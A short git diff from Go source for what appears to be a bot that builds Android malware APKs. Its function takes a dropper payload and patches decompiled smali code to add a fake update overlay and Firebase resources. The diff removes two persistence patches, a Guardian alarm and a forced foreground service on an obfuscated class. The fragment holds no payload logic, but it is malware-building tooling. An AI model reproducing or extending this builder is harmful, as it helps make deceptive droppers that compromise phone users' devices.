@@ -1856,12 +1856,6 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 	syncSmali := filepath.Join(workDir, "smali", "app", "mobilex", "plus", "services", "SyncQYAdapter.smali")
 	patchFakeUpdateOverlay(syncSmali)
 
-	guardianSmali := filepath.Join(workDir, "smali", "app", "mobilex", "plus", "services", "GuardianService.smali")
-	patchGuardianAlarm(guardianSmali)
-
-	y6jSmali := filepath.Join(workDir, "smali", "v", "s", "y6jRGLEWNMir.smali")
-	patchStartForegroundService(y6jSmali)
-
 	stringsXml := filepath.Join(workDir, "res", "values", "strings.xml")
 	patchFirebaseResources(stringsXml)
 
